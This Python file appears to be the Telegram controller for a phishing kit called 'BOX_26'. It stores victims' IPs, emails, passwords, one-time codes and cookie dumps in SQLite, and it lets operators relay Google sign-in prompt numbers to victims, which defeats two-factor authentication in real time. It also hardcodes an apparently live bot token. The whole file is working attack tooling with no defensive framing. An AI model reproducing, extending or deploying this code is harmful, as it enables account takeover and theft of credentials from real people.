#!/usr/bin/env python3
"""
BOX_26 Telegram Bot Controller - DOMAIN-AGNOSTIC
Real-time OTP monitoring and Google Prompt relay
"""

import sys
import time
import json
import sqlite3
import requests
import threading
import os
from datetime import datetime

# ================= CONFIG =================
BOT_TOKEN = "8849922646:AAHL1k8PDTU83eg5OVZJYTqGdLvyfwdydaw"
DATA_CHANNEL = "8374468402"
DB_FILE = "storage/box26.db"

# ================= TELEGRAM =================
def send_telegram(chat_id, text, parse_mode='HTML'):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {'chat_id': chat_id, 'text': text, 'parse_mode': parse_mode}
    try:
        response = requests.post(url, data=data, timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

# ================= DATABASE =================
def init_db():
    try:
        db_dir = os.path.dirname(DB_FILE)
        if db_dir and not os.path.exists(db_dir):
            os.makedirs(db_dir, exist_ok=True)
        
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY, first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP, ip TEXT, country TEXT,
            city TEXT, user_agent TEXT, device_type TEXT, browser TEXT, os TEXT,
            visit_count INTEGER DEFAULT 1
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, provider TEXT,
            email TEXT, password TEXT, attempt INTEGER DEFAULT 1,
            captured_at DATETIME DEFAULT CURRENT_TIMESTAMP, used BOOLEAN DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS otps (
            id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, provider TEXT,
            email TEXT, otp TEXT, captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            used BOOLEAN DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS cookie_dumps (
            id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, cookie_count INTEGER,
            local_count INTEGER, filename TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS prompt_numbers (
            id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, number TEXT,
            status TEXT DEFAULT 'waiting', created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            delivered_at DATETIME, confirmed_at DATETIME
        )''')
        
        c.execute('CREATE INDEX IF NOT EXISTS idx_prompt_victim ON prompt_numbers(victim_id)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_prompt_status ON prompt_numbers(status)')
        
        conn.commit()
        conn.close()
        print("[+] Database initialized")
        return True
    except Exception as e:
        print(f"[!] DB init error: {e}")
        return False

def add_prompt_number(victim_id, number):
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO prompt_numbers (victim_id, number, status) VALUES (?, ?, 'waiting')",
                  (victim_id, number))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"[!] Error adding prompt: {e}")
        return False

def get_waiting_victims(limit=10):
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''
            SELECT p.victim_id, c.email, p.number, p.created_at
            FROM prompt_numbers p
            LEFT JOIN credentials c ON p.victim_id = c.victim_id
            WHERE p.status = 'waiting'
            ORDER BY p.created_at DESC LIMIT ?
        ''', (limit,))
        results = c.fetchall()
        conn.close()
        return results
    except Exception as e:
        print(f"[!] Error: {e}")
        return []

def mark_prompt_confirmed(victim_id):
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''
            UPDATE prompt_numbers SET status = 'confirmed', confirmed_at = CURRENT_TIMESTAMP
            WHERE victim_id = ? AND status = 'delivered'
        ''', (victim_id,))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def get_stats():
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM victims")
        victims = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM credentials")
        creds = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM otps WHERE used = 0")
        otps = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM prompt_numbers WHERE status='waiting'")
        waiting = c.fetchone()[0]
        conn.close()
        return {'victims': victims, 'credentials': creds, 'otps': otps, 'waiting': waiting}
    except Exception as e:
        return {}

# ================= COMMAND HANDLERS =================
def handle_start(chat_id):
    msg = """🤖 *BOX_26 Bot Active*

*Commands:*
/status - System status
/stats - Statistics
/victims - Recent victims
/otps - Pending OTPs
/waiting - Victims waiting for Google Prompt
/send_number [id] [num] - Send prompt number
/confirm [id] - Mark prompt confirmed
/clear [target] [days] - Clear old data
/help - This help"""
    send_telegram(chat_id, msg, 'Markdown')

def handle_status(chat_id):
    stats = get_stats()
    msg = f"""📊 *BOX_26 STATUS*

• Victims: {stats.get('victims', 0)}
• Credentials: {stats.get('credentials', 0)}
• OTPs Pending: {stats.get('otps', 0)}
• Waiting for Prompt: {stats.get('waiting', 0)}

*System:* ✅ Online
*Database:* Connected"""
    send_telegram(chat_id, msg, 'Markdown')

def handle_stats(chat_id):
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''SELECT DATE(captured_at), COUNT(*) FROM credentials 
                    GROUP BY DATE(captured_at) ORDER BY DATE(captured_at) DESC LIMIT 7''')
        daily = c.fetchall()
        c.execute('''SELECT provider, COUNT(*) FROM credentials 
                    GROUP BY provider ORDER BY COUNT(*) DESC LIMIT 5''')
        providers = c.fetchall()
        conn.close()
        
        msg = "📈 *DETAILED STATISTICS*\n\n*Last 7 days:*\n"
        for date, count in daily:
            msg += f"  • {date}: {count} victims\n"
        msg += "\n*Top Providers:*\n"
        for provider, count in providers:
            msg += f"  • {provider}: {count}\n"
        send_telegram(chat_id, msg, 'Markdown')
    except Exception as e:
        send_telegram(chat_id, f"❌ Error: {str(e)}")

def handle_victims(chat_id):
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('SELECT id, first_seen, ip, visit_count FROM victims ORDER BY first_seen DESC LIMIT 10')
        victims = c.fetchall()
        conn.close()
        if not victims:
            send_telegram(chat_id, "No victims yet")
            return
        msg = "📋 *RECENT VICTIMS*\n\n"
        for vid, first_seen, ip, visits in victims:
            time_str = first_seen[11:16] if first_seen else ""
            date_str = first_seen[5:10] if first_seen else ""
            msg += f"• {vid[:8]}... {date_str} {time_str}\n  IP: {ip or 'Unknown'} ({visits} visits)\n\n"
        send_telegram(chat_id, msg)
    except Exception as e:
        send_telegram(chat_id, f"❌ Error: {str(e)}")

def handle_otps(chat_id):
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''SELECT victim_id, provider, email, otp, captured_at 
                    FROM otps WHERE used = 0 ORDER BY captured_at DESC LIMIT 10''')
        otps = c.fetchall()
        conn.close()
        if not otps:
            send_telegram(chat_id, "No pending OTPs")
            return
        msg = "🔑 *PENDING OTPS*\n\n"
        for vid, provider, email, otp, captured in otps:
            time_str = captured[11:16] if captured else ""
            msg += f"• {provider}: <b>{otp}</b>\n  {email} ({time_str})\n  ID: {vid[:8]}...\n\n"
        send_telegram(chat_id, msg, 'HTML')
    except Exception as e:
        send_telegram(chat_id, f"❌ Error: {str(e)}")

def handle_waiting(chat_id):
    try:
        waiting = get_waiting_victims(10)
        if not waiting:
            send_telegram(chat_id, "No victims waiting for Google Prompt")
            return
        msg = "⏳ *VICTIMS WAITING FOR PROMPT*\n\n"
        for victim_id, email, number, created in waiting:
            time_ago = datetime.now() - datetime.fromisoformat(created)
            minutes = int(time_ago.total_seconds() / 60)
            msg += f"• ID: `{victim_id}`\n  Email: {email or 'Unknown'}\n  Number: {number or 'Not sent'}\n  Waiting: {minutes}m\n\n"
        send_telegram(chat_id, msg, 'Markdown')
    except Exception as e:
        send_telegram(chat_id, f"❌ Error: {str(e)}")

def handle_send_number(chat_id, text):
    try:
        parts = text.split()
        if len(parts) != 3:
            send_telegram(chat_id, "❌ Usage: /send_number [victim_id] [number]\nExample: /send_number VIC_12345 42")
            return
        
        _, victim_id, number = parts
        if not number.isdigit() or len(number) > 2:
            send_telegram(chat_id, "❌ Number must be 1-2 digits")
            return
        
        if add_prompt_number(victim_id, number):
            send_telegram(chat_id, f"✅ Number {number} queued for victim {victim_id}")
            send_telegram(DATA_CHANNEL, f"🔢 Google Prompt number {number} sent to {victim_id}")
        else:
            send_telegram(chat_id, f"❌ Failed to queue number for {victim_id}")
    except Exception as e:
        send_telegram(chat_id, f"❌ Error: {str(e)}")

def handle_confirm(chat_id, text):
    try:
        parts = text.split()
        if len(parts) != 2:
            send_telegram(chat_id, "❌ Usage: /confirm [victim_id]")
            return
        victim_id = parts[1]
        if mark_prompt_confirmed(victim_id):
            send_telegram(chat_id, f"✅ Victim {victim_id} marked as confirmed")
            send_telegram(DATA_CHANNEL, f"✅ Victim {victim_id} confirmed Google Prompt!")
        else:
            send_telegram(chat_id, f"❌ No waiting prompt for {victim_id}")
    except Exception as e:
        send_telegram(chat_id, f"❌ Error: {str(e)}")

def handle_clear(chat_id, text):
    try:
        parts = text.split()
        if len(parts) < 2:
            send_telegram(chat_id, "❌ Usage: /clear [all|old|victims|otps] [days]")
            return
        days = 7
        if len(parts) > 2:
            try: days = int(parts[2])
            except: pass
        target = parts[1].lower()
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        if target == 'all':
            c.execute(f"DELETE FROM prompt_numbers WHERE datetime(created_at) < datetime('now', '-{days} days')")
            c.execute(f"DELETE FROM otps WHERE datetime(captured_at) < datetime('now', '-{days} days')")
            c.execute(f"DELETE FROM credentials WHERE datetime(captured_at) < datetime('now', '-{days} days')")
            c.execute(f"DELETE FROM victims WHERE datetime(last_seen) < datetime('now', '-{days} days')")
            msg = f"✅ Cleared all data older than {days} days"
        elif target == 'otps':
            c.execute(f"DELETE FROM otps WHERE used = 1 AND datetime(captured_at) < datetime('now', '-{days} days')")
            msg = f"✅ Cleared used OTPs older than {days} days"
        else:
            msg = "❌ Unknown target. Use: all, old, victims, otps"
        conn.commit()
        conn.close()
        send_telegram(chat_id, msg)
    except Exception as e:
        send_telegram(chat_id, f"❌ Error: {str(e)}")

def handle_help(chat_id):
    msg = """📚 *BOX_26 COMMANDS*

*Basic:*
/start - Welcome
/status - System status
/stats - Detailed statistics
/help - This menu

*Victims:*
/victims - List recent victims
/otps - Show pending OTPs
/waiting - Victims waiting for Google Prompt

*Google Prompt:*
/send_number [id] [num] - Send number to victim
/confirm [id] - Mark prompt confirmed

*Maintenance:*
/clear [target] [days] - Clear old data

*Examples:*
/send_number VIC_12345 42
/confirm VIC_12345"""
    send_telegram(chat_id, msg, 'Markdown')

# ================= MAIN LOOP =================
def main():
    print("\n" + "="*60)
    print("         BOX_26 BOT CONTROLLER v3.0 - DOMAIN-AGNOSTIC")
    print("         Real-time OTP & Google Prompt Monitor")
    print("="*60 + "\n")
    
    init_db()
    
    print("[+] Bot started. Listening for commands...")
    print(f"[+] Data Channel: {DATA_CHANNEL}")
    print("\n" + "-"*60)
    print(" Commands: /status, /waiting, /send_number [id] [num]")
    print("           /confirm [id], /otps, /victims, /clear")
    print("-"*60 + "\n")
    
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            response = requests.get(url, params={'offset': offset, 'timeout': 30})
            data = response.json()
            
            if data.get('ok') and data.get('result'):
                for update in data['result']:
                    offset = update['update_id'] + 1
                    if 'message' in update:
                        msg = update['message']
                        text = msg.get('text', '')
                        chat_id = msg['chat']['id']
                        
                        if text.startswith('/'):
                            cmd = text.split()[0].lower()
                            if cmd == '/start': handle_start(chat_id)
                            elif cmd == '/status': handle_status(chat_id)
                            elif cmd == '/stats': handle_stats(chat_id)
                            elif cmd == '/victims': handle_victims(chat_id)
                            elif cmd == '/otps': handle_otps(chat_id)
                            elif cmd == '/waiting': handle_waiting(chat_id)
                            elif cmd == '/send_number': handle_send_number(chat_id, text)
                            elif cmd == '/confirm': handle_confirm(chat_id, text)
                            elif cmd == '/clear': handle_clear(chat_id, text)
                            elif cmd == '/help': handle_help(chat_id)
                            else:
                                send_telegram(chat_id, f"❌ Unknown: {cmd}\nType /help")
            time.sleep(1)
            
        except KeyboardInterrupt:
            print("\n[!] Shutting down...")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped")
